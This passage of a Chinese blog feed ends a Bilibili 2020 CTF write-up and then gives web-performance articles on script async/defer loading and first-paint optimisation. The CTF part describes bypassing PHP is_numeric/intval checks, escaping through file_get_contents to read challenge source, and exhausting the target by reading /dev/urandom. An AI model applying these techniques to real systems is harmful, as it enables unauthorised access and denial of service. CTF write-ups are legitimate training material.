Bypass <code>is_numeric</code>、<code>intval</code>，我找到了一篇写的还挺全面的文章「<a href=\"https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/\">CTF 中常见 PHP 特性学习笔记</a>」。</p>\n<blockquote><p>顺便，不少战队和选手通过 <code>$file_get_contents</code> 逃逸后，把每道题的源码都读了一遍、甚至通过读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 拖死了靶机，不过这已经是后话了。</p></blockquote>\n<h2>尾声</h2>\n<p>USTC Hackergame 2018 为了「黑曜石浏览器」的题专门上线了一个官网、在那个官网的源码中隐藏了 Heicore Browser 的 User-Agent，Bilibili 的第二题是一个非常拙劣的模仿；第三题直接就是脑筋急转弯，和渗透、社工毫无关联，密码纯粹靠猜；第四题更是表现了出题人的前端知识基本为 0，使用从 CSDN 上抄来的 URL 参数解析代码，却不知道 JavaScript 中 <code>unescape</code> 不能处理非 ASCII 字符（更不必说 <code>unescape</code> 是一个已被弃用的方法），基本上是个前端都知道宁肯引入 <code>URL.searchParams</code> 的 Polyfill 也不应该自己解析 URL；第五题并没有明确提示告诉大家应该从给定的默认 uid 开始刷（你给我翻译翻译，谁家系统的超级管理员 uid 不是小于 10 而是大于 1 亿的？）。在经过了这么多无厘头的题目以后，接下来上来就是五道 Web 盲题：未设防 Redis 题本来可以深入到 Get shell、提权的，结果第八题草草 <code>get flag8</code> 了事；第十题的「文件路径猜解」更是非常无厘头，当做题人构建完能绕过 <code>is_numeric</code> 和 <code>intval</code>  的 Payload 后，还要猜测 <code>url</code> 参数的取值需要包含 <code>flag.txt</code> 才能取到最终的 flag；而且第十题拿到的图片直接 <code>tail</code> 就能拿到 flag，而图片隐写本来是非常经典的 CTF 考法。</p>\n<p>无厘头的题目、加上混乱的活动页面（Vue 和 jQuery 齐飞、Element UI 共 Bootstrap 一色），再联想起 Bilibili 中间件源码泄漏、Anankke 在新年活动上 <a href=\"https://blog.anank.ke/w/pilipili_cheers\">只用两小时就刷出了 11 亿美食值</a>，我们大体上可以猜测的出 Bilibili 内部混乱的管理、松散的组织，和极度不重视信息安全、乃至极度不重视技术的风气。Bilibili 这一次的 CTF 暴露出来的问题，远不止选手用 <code>/blog/end.php</code> 读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 耗尽靶机性能导致题目 404 这么简单了。</p>\n<div class=\"license\">\n<div>Bilibili 2020「1024 程序员节」CTF Write Up</div>\n<div><a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2020-10-25</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/"},{"title":"从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性","date":"2020-10-13 09:25:00","description":"\n<p>之前我在「<a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">天下武功，唯快不破 —— 我是这样优化博客的</a>」一文中提到「对于大部分浏览器来说，确保 JS 异步加载和执行的做法其实是在操作 DOM 动态插入 <code>&lt;script async&gt;</code>」，但是并没有给出详细原因。这一次我以 Google Analytics 的统计代码为引子，详细讲讲 <code>&lt;script&gt;</code> 的 <code>async</code> 和 <code>defer</code> 属性、以及它们背后的故事。</p>\n<h2>拆开 Google Analytic 的统计代码</h2>\n<p>现在 Google 推出了 Google Tag Manager，通过 <code>window.gtag</code> 可以轻易加载包括 <code>analytics.js</code>、Google AD、Google OAuth 等 Google 插件：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Global site tag (gtag.js) - Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"https://www.googletagmanager.com/gtag/js?id=UA-122669675-1\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-built_in\">window</span>.dataLayer = <span class=\"hljs-built_in\">window</span>.dataLayer || [];</span><span class=\"javascript\">  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">gtag</span>(<span class=\"hljs-params\"></span>)</span>{dataLayer.push(<span class=\"hljs-built_in\">arguments</span>);}</span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'js'</span>, <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>());</span><span class=\"javascript\"></span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'config'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>在 Google Tag Manager 出现之前，大部分人更熟悉传统的 <code>analytics.js</code> 统计代码：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">i,s,o,g,r,a,m</span>)</span>{i[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>]=r;i[r]=i[r]||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{</span><span class=\"javascript\">(i[r].q=i[r].q||[]).push(<span class=\"hljs-built_in\">arguments</span>)},i[r].l=<span class=\"hljs-number\">1</span>*<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();a=s.createElement(o),</span><span class=\"javascript\">m=s.getElementsByTagName(o)[<span class=\"hljs-number\">0</span>];a.async=<span class=\"hljs-number\">1</span>;a.src=g;m.parentNode.insertBefore(a,m)</span><span class=\"javascript\">})(<span class=\"hljs-built_in\">window</span>,<span class=\"hljs-built_in\">document</span>,<span class=\"hljs-string\">'script'</span>,<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>,<span class=\"hljs-string\">'ga'</span>);</span><span class=\"javascript\"></span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 提供的代码是经过压缩后的版本。不过这段代码很短，完全不使用 debugger 等方法也可以还原出原始的代码，让我们拆拆看吧。</p>\n<p>首先不难看出这是一个 IIFE 函数，变量 <code>i</code>、<code>s</code>、<code>o</code>、<code>g</code> 和 <code>r</code>分别指的是 <code>window</code>、<code>document</code>、<code>'script'</code>、<code>https://www.google-analytics.com/analytics.js</code> 和 <code>'ga'</code>（变量 <code>a</code> 和 <code>m</code> 尚未被赋值）。让我们替换这些变量、把 IIFE 拆开：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>] = <span class=\"hljs-string\">'ga'</span>;<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] = <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] || <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{  <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q = (<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q || []).push(<span class=\"hljs-built_in\">arguments</span>)};<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].l = +<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();<span class=\"hljs-keyword\">var</span> a = <span class=\"hljs-built_in\">document</span>.createElement(<span class=\"hljs-string\">'script'</span>);a.async = <span class=\"hljs-number\">1</span>;a.src = <span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>;<span class=\"hljs-keyword\">var</span> m = <span class=\"hljs-built_in\">document</span>.getElementsByTagName(<span class=\"hljs-string\">'script'</span>)[<span class=\"hljs-number\">0</span>];m.parentNode.insertBefore(a, m);</code></pre>\n<p>这下就清楚多了。抛开 Google Analytics 的队列初始化、函数初始化的操作，<code>analytics.js</code> 本质上是通过 JS 动态创建一个 <code>&lt;script async&gt;</code> 标签、并插入到 DOM 中所有 <code>&lt;script&gt;</code> 标签之前。</p>\n<p><a href=\"https://developers.google.com/analytics/devguides/collection/analyticsjs/\">Google 关于 <code>analytics.js</code> 的文档</a> 是这么介绍的：</p>\n<blockquote>\n<p>While the Google Analytics tag described above ensures the script will be loaded and executed asynchronously on all browsers, it has the disadvantage of not allowing modern browsers to preload the script.</p>\n<p>虽然上述代码保证了脚本在所有浏览器上都会异步地加载和执行，但是它也有一个缺陷、它不能够让浏览器 preload 外部的脚本文件。</p>\n</blockquote>\n<p>Google 在文档中也给出了「现代浏览器」专用的代码，看起来和今天的 Google Tag Manager 载入代码非常接近：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\"><span class=\"hljs-built_in\">window</span>.ga=<span class=\"hljs-built_in\">window</span>.ga||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{(ga.q=ga.q||[]).push(<span class=\"hljs-built_in\">arguments</span>)};ga.l=+<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>;</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 文档也对第二种代码进行了介绍：</p>\n<blockquote>\n<p>The alternative async tag below adds support for preloading, which will provide a small performance boost on modern browsers, but can degrade to synchronous loading and execution on IE 9 and older mobile browsers that do not recognize the <code>async</code> script attribute.</p>\n<p>第二种方法在现代浏览器上会略微提升性能，因为现代浏览器支持 preloading。但是在不认识 <code>async</code> 属性的 IE9 和一些老旧的移动端浏览器上，这种方法会降级为同步加载和执行。</p>\n</blockquote>\n<p>所以，结合上述代码和 Google 文档中的描述，我们不难得出结论：</p>\n<ul>\n<li>第一种做法（由 JS 生成 <code>&lt;script async&gt;</code> 标签、动态插入 DOM 中）可以确保 <code>analytics.js</code> 被异步加载和执行，但是在现代浏览器上由于不能提前发现 <code>analytics.js</code> 、不能 preload。</li>\n<li>第二种做法在 HTML 中直接声明了 <code>&lt;script async&gt;</code>、可以被现代浏览器在 Parse HTML 阶段发现 <code>analytics.js</code> 并 preload。但是对于「并不现代的」浏览器中，这种做法不能保证 <code>analytics.js</code> 被异步加载和执行。</li>\n</ul>\n<p>那么，为什么 Google 要这么说呢？</p>\n<h2>混乱的 defer 和 async 实现</h2>\n<p>绝大部分从事前端开发的程序员应该都非常了解 <code>defer</code> 和 <code>async</code> 以及他们的区别：</p>\n<ul>\n<li>\n<code>async</code> 的加载不会阻碍 DOM 的解析，但是当加载完后就会立即执行，执行时会阻碍 DOM 的解析</li>\n<li>\n<code>defer</code> 的加载也不会阻碍 DOM 的解析，并且会在 DOM 解析完后、<code>DOMContentLoaded</code> 触发之前执行</li>\n</ul>\n<p>鲜少有人知道的是，在 HTML5 之前，异步加载和执行外部脚本有一段混乱而荒唐的历史。</p>\n<p><code>defer</code> 属性的历史可以追溯到 1999 年 12 月 24 日制定的 HTML4.01 规范。在 <a href=\"https://www.w3.org/TR/html401/interact/scripts.html#adef-defer\">规范的第 18.2 节中的 18.2.1「SCRIPT 元素」</a> 中，有对 <code>defer</code> 属性的描述：</p>\n<blockquote>\n<p>When set, this boolean attribute provides a hint to the user agent that the script is not going to generate any document content (e.g., no \"document.write\" in javascript) and thus, the user agent can continue parsing and rendering.</p>\n<p>该 Boolean Attribute 用于提示 User Agent 这份脚本不会生成 document 内容（如，不使用 <code>document.write</code>），因此 User Agent 在遇到该脚本时不应该暂停解析和渲染 document。</p>\n</blockquote>\n<p>值得注意的是，在 HTML4.01 规范中没有强制浏览器用什么行为面对 <code>defer</code> 属性，各个浏览器的实现导致了千奇百怪的行为，这里仅简单列举几个 Quirk 行为：</p>\n<ul>\n<li>2001 年发布的 IE 6 开始对 <code>defer</code> 属性提供支持，但是直到 11 年后 IE 10 发布之前，IE 都不能保证带有 <code>defer</code> 属性的 <code>&lt;script&gt;</code> 能够按顺序执行：如果第一个 <code>defer</code> 的 <code>&lt;script&gt;</code> 使用 DOM API 修改了 DOM 结构、那么第二个 <code>&lt;script defer&gt;</code> 会在第一个 <code>&lt;script&gt;</code> 执行完毕之前就会开始执行。</li>\n<li>2009 年发布的 Firefox 3.5 开始对 <code>defer</code> 属性提供支持，<a href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=688580\">但是带有 <code>defer</code> 的 <code>&lt;script&gt;</code> 可能会在 <code>DOMContentLoaded</code> 之后加载和执行</a>，而且 Firefox 甚至会异步执行带有 <code>defer</code> 属性的内联脚本。这一行为直到五年后在 Firefox 31 中才被修复。</li>\n<li>2010 年的 Chrome 8 开始实现 <code>defer</code> 属性。但如果页面的 MIME Type 为 XHTML（<code>application/xhtml+xml</code>），那么 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=874749\">Chrome 会无视 <code>&lt;script&gt;</code> 的 <code>defer</code> 属性</a>，因为 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=611136\">在 XHTML 中 <code>defer</code> 属性只是一个可选实现</a>。</li>\n</ul>\n<p>终于在 HTML5 中，不仅 <code>defer</code> 应有的行为被正式确定下来，而且还介绍了一个新的属性 <code>async</code>，提供了「真正异步地」加载和执行外部脚本的方式。也正是因为 HTML5 正式发布，下面这张介绍 <code>defer</code> 和 <code>async</code> 区别的图也开始深入人心：</p>\n<p><img src=\"https://pic.skk.moe/file/moegirl/ckz6vn6qm00003f5yh5f0tvq8.svg\"></p>\n<blockquote><p>这张出现在绝大部分文章中的图，正是来自 HTML5 规范：<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async\">https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async</a></p></blockquote>\n<p>IE 10、Chrome 8、Firefox 3.6 都对 <code>async</code> 属性提供了支持。相对于 <code>defer</code> 混乱的实现，浏览器对 <code>async</code> 的实现可谓是乖巧了许多：除 Safari 5.0 会无视 <code>async</code> 的取值外（<code>async=false</code> 时仍然会异步地加载和执行该外部脚本。这一 Bug 在 Safari 5.1 即被修复），绝大部分浏览器的实现都很正常。</p>\n<h2>等等，动态插入的 script 标签呢</h2>\n<p>如果你还记得 Google 给出的第一种 <code>analytics.js</code> 的加载方法的话（什么？你不记得了？快回到第一节再看一遍），你会注意到 Google 为了「保证了脚本在所有浏览器上都会异步地加载和执行」，使用了 <code>document.createElement('script')</code> 和 <code>el.parentNode.insertBefore</code> 动态插入 <code>&lt;script&gt;</code> 标签。这就引出了这一节的内容：动态插入的 <code>&lt;script&gt;</code> 应该按照什么顺序加载和执行呢？</p>\n<p>这个问题在 HTML4.01 的规范中完全没有说明，因此 HTML5 发布之前，当时的浏览器也依然采用了自己的实现：</p>\n<ul>\n<li>对于 WebKit、Blink 和 IE，动态插入的脚本将会被默认视为需要被异步加载和执行的脚本。如果要同步执行，需要显式声明 <code>async = false</code>。</li>\n<li>对于 Presto（早期 Opera 使用的自研内核）和 Firefox &lt;= 4，动态插入的脚本会默认同步加载和执行，除非显示声明 <code>async = true</code>。不过从 Firefox 4.0 开始，动态插入的脚本将会异步加载和执行，以和 IE、WebKit 行为保持一致（因此同步执行也一样需要显式声明 <code>async = false</code> ）；当 Opera 15 开始更换为基于 Chormium 开发（当时 Chromium 版本为 28）后，行为也变得和 IE、WebKit 一致。</li>\n</ul>\n<p>在 HTML5 规范中，这一问题终于被一劳永逸的解决了。在「<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#script-processing-model\">HTML Standard - 4.12.1.1 Processing Model</a>」中明确规定了浏览器应该如何处理动态插入的 <code>&lt;script&gt;</code>。对于传统的脚本（非 Module），大致处理流程如下所示：</p>\n<blockquote><p>本图由 Sukka 绘制，按照 CC BY-NC-SA 4.0 协议共享。使用时请遵守许可协议，注明出处、不得被用于商业用途（除非获得书面许可）。</p></blockquote>\n<h2>尾声</h2>\n<p>Google Analytics 在 2013 年开始逐渐用 <code>analytics.js</code> 代替 <code>ga.js</code> 时，市面上同时存在有现代的支持 HTML5 和 <code>async</code> 属性的浏览器、和不支持 <code>async</code> 属性的「前 HTML5 时代的」古董浏览器。如果要保证在所有的浏览器上 Google Analytics 都能被异步地加载和执行，动态地将 <code>&lt;script&gt;</code> 标签插入 DOM 中、并显式声明 <code>async = true</code> 无疑是唯一的方法。随着古董浏览器逐渐退出人们的视线、实现 <code>async</code> 属性的浏览器在全球的份额已经达到了 98.08%，Google 终于开始直接用 <code>&lt;script async&gt;</code> 标签引入 Google Tag Manager。</p>\n<div class=\"license\">\n<div>从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性</div>\n<div><a href=\"https://blog.skk.moe/post/script-async-defer/\">https://blog.skk.moe/post/script-async-defer/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2020-10-13</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/script-async-defer/"},{"title":"再快一点，再快一点 —— 优化博客白屏时间的实践","date":"2020-10-03 08:40:00","description":"\n<p>两个多月以前，我写了一篇文章 <a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">介绍我是如何优化我的博客的</a>，但是我对于博客的白屏时间仍然不满意。过去一个月我在博客上进行了一系列优化实践，终于成功将博客的白屏时间减少了将近 50%，这篇文章就来记录优化的过程和方案。</p>\n<h2>确定和分析白屏时间</h2>\n<p>First Paint 和 First Contentful Paint 是衡量白屏时间的重要指标。Google Chrome 团队提供了专门的库 <code>web-vitals</code> 用于在浏览器中衡量这些指标。直接在本地开发环境中引入该库：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">\"module\"</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-keyword\">import</span> {getFCP, getLCP, getFID} <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'https://unpkg.com/web-vitals@0.2.4/dist/web-vitals.es5.min.js?module'</span>;</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Contentful Paint</span></span><span class=\"javascript\">  getFCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 Largest Contentful Paint</span></span><span class=\"javascript\">  getLCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Input Delay</span></span><span class=\"javascript\">  getFID(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>访问在本地运行的 Hexo Server 实例（<code>http://localhost:4000</code>），打开任意一篇文章，然后在 Dev Tools 中切换到「Performance」Tab 中限制 Network 和 CPU 性能：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/1.png\" width=\"1276\" height=\"279\"></p>\n<blockquote><p>进行性能测试时，模拟移动端的网络和性能是非常重要的。然而，Firefox 的 Dev Tools 至今很遗憾地没有实现这个功能（许多类似的 Feature Request 在 Bugzilla 已经 stall 数个月了）。这也是为什么我钟情于使用 Chromium Based 的浏览器开发的原因。</p></blockquote>\n<p>刷新页面，Console 中会输出三个数值（单位均为毫秒）：</p>\n<pre><code class=\"hljs plaintext\">FCP 1537.4400000000605LCP 1921.934FID 3.559999997378327</code></pre>\n<p>可以看到，First Contentful Paint 时间在 1.5 秒左右、而 Largest Contentful Paint（最大的可视元素，此时是文章的头图）是 1.9 秒。考虑到这是在本地环境、TTFB 只受模拟的「Fast 3G」限制，不难想象在实际访客体验中白屏时间绝对不止 1.5 秒。</p>\n<h2>分析性能瓶颈</h2>\n<p>肯定了问题的确存在，接下来就需要寻找性能瓶颈了。在「Performance」Tab 中将 CPU 性能修改为「6x slowdown」放大性能瓶颈，然后用「Start profiling and reload page」按钮刷新页面和获取火焰图：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/2.png\" width=\"1386\" height=\"946\"></p>\n<p>其中，Layout 占据的时间（117.43ms）比 Parse HTML（22.48ms）和 Recalculate Style（20.37ms）都要长得多，基本可以认定这就是性能瓶颈了。接下来判断是页面什么元素导致了 Layout 的性能瓶颈。对博客中其它页面进行 Profiling，并将火焰图进行对比：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/3.png\" width=\"860\" height=\"450\"></p>\n<blockquote><p>从左往右分别是 「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」、首页、「<a href=\"https://blog.skk.moe/post/hello-world/\">Hello World</a>」页面的火焰图和 Layout 用时。</p></blockquote>\n<p>根据火焰图和三个页面的特征，猜测是文章内容部分导致了 Layout 用时过长。为了加以验证，在 CSS 中使用 <code>display: none</code> 将文章内容直接从 DOM 中离线，然后重新生成火焰图。</p>\n<blockquote><p>在页面渲染时， <code>display: none</code>  的元素会直接从 DOM 中离线、不参加 Style 和 Layout。</p></blockquote>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/4.png\" width=\"1194\" height=\"946\"></p>\n<p>将文章内容设置 <code>display: none</code> 后，Layout 性能直接提升了三倍，所以可以确认性能瓶颈就是文章内容的 Layout 了。</p>\n<h2>优化白屏时间</h2>\n<p>文章内容的 Layout 时间比较长，而文章内容在加载完之前不会触发 First Paint。所以如果需要缩短白屏时间，就必须缩短文章内容 Layout 的用时。</p>\n<p>Layout 是浏览器计算元素几何信息的过程：元素的大小、在页面中的位置。Layout 性能一般和 DOM 元素数量、布局复杂性、布局模型有关。对于 DOM 元素数量这一点没有什么好的解决方案 —— 文章就这么长、每个段落就是一个 <code>&lt;p&gt;</code> 元素；对于文章内容也没有布局复杂性或布局模型可言。因此这是一条死路。</p>\n<p>直接对着自己的博客动死脑筋是行不通的，我决定先和其他的内容网站的 Layout 性能对比一下：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/5.png\" width=\"960\" height=\"500\"></p>\n<blockquote><p>上图左一为知乎专栏文章「<a href=\"https://zhuanlan.zhihu.com/p/25800461\">PWA 在饿了么的实践经验</a>」的火焰图；左二为 QuQuBlog「<a href=\"https://imququ.com/post/optimize-tls-handshake.html\">TLS 握手优化详解</a>」的火焰图；左三为 dev.to 的「<a href=\"https://dev.to/mustapha/css-grid-illustrated-introduction-52l5\">CSS Grid: illustrated introduction</a>」的火焰图。</p></blockquote>\n<p>和其它内容网站比较发现，当页面包含较长篇幅的内容时，「CPU 6x slowdown」下 Layout 用时大抵在 100ms 到 200ms 左右。我的博客内容页面 Layout 用时在 120ms 属于正常范围、基本没有进一步优化的空间。</p>\n<p>不过，我在看 dev.to 的火焰图时发现了一个很有趣的现象：虽然完整 DOM 的 Layout 用时在 123.70ms、但是却发生在 First Paint 和 First Contentful Paint 之后。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/6.png\" width=\"1090\" height=\"314\"></p>\n<p>结合截图和火焰图可以发现，dev.to 在加载文章页面时，先只渲染 Navbar、触发 First Paint、结束白屏；之后继续 Parse HTML、渲染页面主体内容；最后是 Lazyload 后的文章头图、触发 Largest Contentful Paint。这种思路在 H5、小程序中都是很常见：使用 Placeholder （被称为 AppShell）缩短白屏时间、然后再通过 AJAX 获取数据填充到页面上。但是静态博客和小程序最大的区别就是不需要获取数据、文章内容是直接包含在 HTML 中返回的，所以在博客上实践这样的思路需要做一些改变。</p>\n<p>我的做法则是将 CSS 拆分，将 Navbar 和右下角 Fab 按钮的 CSS 提取出来、内联在 HTML 中、当页面加载时就可以 Style &amp; Layout。同时为页面主题内容添加 <code>display: none</code> 使其在 DOM 中离线，使其不影响 First Paint；页面主体内容的 CSS（包括  <code>display: block</code>） 拆分成独立的 CSS。由于 CSS 是「渲染阻塞（Render Blocking）」的资源，浏览器在 Parse HTML 时如果遇到 CSS 就会开始请求、并在 CSS 下载完成之前不会开始 Style &amp; Layout。因此，需要一个小 trick 实现异步加载 CSS（使 CSS 不再阻塞渲染）：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span> <span class=\"hljs-attr\">media</span>=<span class=\"hljs-string\">\"print\"</span> <span class=\"hljs-attr\">onload</span>=<span class=\"hljs-string\">\"this.media='all';this.onload=null\"</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">noscript</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">noscript</span>&gt;</span></code></pre>\n<p>带有 <code>[media=print]</code> 属性的 CSS 仍然会以低优先级加载，但并不会直接参与 Style &amp; Layout、因此不会阻塞渲染。当 CSS 文件下载后触发 <code>onload</code> 事件、将 <code>media</code> 属性改为 <code>all</code>、使 CSS 在当前页面生效。</p>\n<p>为了使白屏不显得枯燥，我还加了一个「加载中」的闪烁动画，使用 <code>animation-delay</code> 延迟 0.6 秒显示。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/9.png\" width=\"813\" height=\"849\"></p>\n<p>不过使用这种方案需要注意两个问题。一是当页面内容被 <code>display: none</code> 后、页面的高度会小于 viewport、因此浏览器不会展示滚动条；当页面内容被覆盖为 <code>display: block</code> 后、浏览器会重新展示滚动条、导致抖动，因此需要为 <code>&lt;html&gt;</code> 添加 <code>overflow-y: scroll</code>。另一个问题是新的 CSS 生效时会触发新的 Style &amp; Layout、可能会导致已经渲染过的 Navbar 和 Fab 按钮被再次 Layout，造成性能浪费；解决方案是使用「<a href=\"https://drafts.csswg.org/css-contain/\">CSS Containment</a>」草案中引入的 <code>contain</code> 属性，通过在 CSS 中显式声明当前元素及其后代与 DOM 的关系，当浏览器重新计算样式和布局时只会影响有限的 DOM。截至本文写就，Edge（Chromium Based）、Firefox、Chrome 都已经对 <code>contain</code> 属性提供了支持。关于 CSS Containment 的用法，可以参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/CSS/contain\">MDN 上对 contain 的说明</a>。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/7.png\" width=\"800\" height=\"368\"></p>\n<p>同时，如果使用异步加载 CSS，那么页面主体内容的显示时机就会受到两个因素制约 —— 除 Style &amp; Layout 外、还有 CSS 的加载。为了尽可能消除 CSS 加载对文章内容显示的影响，我为 CSS 设置了 HTTP/2 Push，这样 CSS 能够和 HTML 同时到达浏览器、但不会马上参与 First Paint 的 Style &amp; Layout。关于 HTTP/2 Push 的更多细节，可以参考我的文章「<a 